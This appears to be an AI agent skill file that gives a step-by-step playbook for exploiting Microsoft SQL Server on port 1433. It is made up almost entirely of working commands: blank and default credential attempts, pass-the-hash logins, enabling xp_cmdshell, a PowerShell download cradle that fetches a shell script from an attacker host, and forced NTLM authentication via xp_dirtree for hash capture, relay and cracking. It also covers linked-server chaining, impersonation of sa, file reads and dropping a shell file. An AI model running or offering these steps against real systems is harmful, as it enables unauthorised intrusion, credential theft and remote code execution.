---
name: mssql
description: MSSQL exploitation (port 1433). Use when port 1433 is open. Covers guest/sa auth, xp_cmdshell, Net-NTLMv2 capture via xp_dirtree, linked server chains, Windows auth, UNC path injection.
user-invocable: false
allowed-tools: Read
---

# MSSQL — Port 1433

## Step 1 — authentication attempts
```bash
# Guest / empty auth (try before assuming auth is required)
nxc mssql {IP} -u '' -p '' -d .                           # empty creds
nxc mssql {IP} -u 'guest' -p '' -d .
mssqlclient.py -port 1433 -windows-auth ./:{blank}@{IP}       # anonymous

# SQL auth (sa account)
nxc mssql {IP} -u 'sa' -p ''                              # blank sa password
nxc mssql {IP} -u 'sa' -p 'sa'
nxc mssql {IP} -u 'sa' -p '{PASS}'

# Windows auth (domain credentials)
mssqlclient.py {DOMAIN}/{USER}:'{PASS}'@{IP} -windows-auth
mssqlclient.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -windows-auth
nxc mssql {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} --local-auth  # local account

# Check who can log in
nxc mssql {IP} -u users.txt -p '{PASS}' -d {DOMAIN}
```

## Step 2 — basic enumeration (from mssqlclient.py shell)
```sql
SELECT @@version;                        -- SQL Server version
SELECT SYSTEM_USER;                      -- current login
SELECT USER_NAME();                      -- current DB user
SELECT IS_SRVROLEMEMBER('sysadmin');     -- am I sysadmin? (1 = yes)
SELECT name FROM master.dbo.sysdatabases;-- list databases
USE {DATABASE}; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

```bash
# From Linux
nxc mssql {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} --query "SELECT @@version"
nxc mssql {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} --query "SELECT SYSTEM_USER"
```

## Step 3 — xp_cmdshell (RCE if sysadmin)
```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://{ATTACKER}/shell.ps1'')"';
```

```bash
# From nxc
nxc mssql {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} -x 'whoami'         # auto enables xp_cmdshell
nxc mssql {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} -X 'whoami'         # PowerShell
```

## Step 4 — Net-NTLMv2 capture via xp_dirtree (no sysadmin needed)
Works with any SQL login — forces the SQL Server service account to authenticate to your listener.
```bash
# Terminal 1: start responder
sudo responder -I {IFACE} -v

# Terminal 2: trigger UNC auth from SQL Server
mssqlclient.py {DOMAIN}/{USER}:'{PASS}'@{IP} -windows-auth
```
```sql
EXEC xp_dirtree '\\{ATTACKER_IP}\share', 1, 1;
EXEC master..xp_dirtree '\\{ATTACKER_IP}\share';
EXEC xp_fileexist '\\{ATTACKER_IP}\share\test';            -- alternative
```
```bash
# Or via ntlmrelayx instead of responder (relay instead of capture)
ntlmrelayx.py -t smb://{TARGET_IP} -smb2support
# Then trigger xp_dirtree → relays SQL service account NTLM to target

# Crack the Net-NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Step 5 — linked server exploitation
```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
SELECT * FROM sys.linked_logins;

-- Check who you are on the linked server
SELECT * FROM OPENQUERY([{LINKED_SRV}], 'SELECT SYSTEM_USER, USER_NAME()');
EXEC ('SELECT SYSTEM_USER') AT [{LINKED_SRV}];

-- Enable xp_cmdshell on linked server (single hop)
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{LINKED_SRV}];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{LINKED_SRV}];
EXEC ('xp_cmdshell ''whoami''') AT [{LINKED_SRV}];

-- Double-hop (A → B → C)
EXEC ('EXEC (''xp_cmdshell ''''whoami''''; '') AT [{LINKED_B}]') AT [{LINKED_A}];

-- Capture Net-NTLMv2 via linked server
EXEC ('xp_dirtree ''\\{ATTACKER_IP}\share''') AT [{LINKED_SRV}];
```
**sa or sysadmin on linked server = SYSTEM on that machine via xp_cmdshell.**

## Step 6 — impersonation (EXECUTE AS)
```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa or another login
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;                                          -- confirm
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;           -- now you have sysadmin
EXEC xp_cmdshell 'whoami';
```

## Step 7 — read files (if sysadmin or ADMINISTER BULK OPERATIONS)
```sql
CREATE TABLE tmp_file (line VARCHAR(MAX));
BULK INSERT tmp_file FROM 'C:\Windows\System32\drivers\etc\hosts' WITH (ROWTERMINATOR='\n');
SELECT * FROM tmp_file;
DROP TABLE tmp_file;
```

## Step 8 — write files / drop reverse shell
```sql
-- Write file via OLE Automation (requires sysadmin)
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @obj INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @obj OUTPUT;
EXEC sp_OAMethod @obj, 'CreateTextFile', NULL, 'C:\Temp\shell.bat', 1;
-- Write content...
```

## Gotchas
- **Guest auth** → often overlooked; always try empty creds before assuming auth needed
- **xp_dirtree** → works without sysadmin; always try for Net-NTLMv2 capture
- **Service account** → SQL Server often runs as a domain account; captured hash = domain cred
- **Linked servers** → chain multiple hops; each hop may have different privileges
- **EXECUTE AS** → check impersonation rights before assuming you're stuck as low-priv login
- **Windows auth vs SQL auth** → try both; Windows auth uses domain creds
- **xp_cmdshell disabled** → check impersonation to sa first, then enable
- **Firewall** → port 1433 may be internal only; check if accessible from your IP
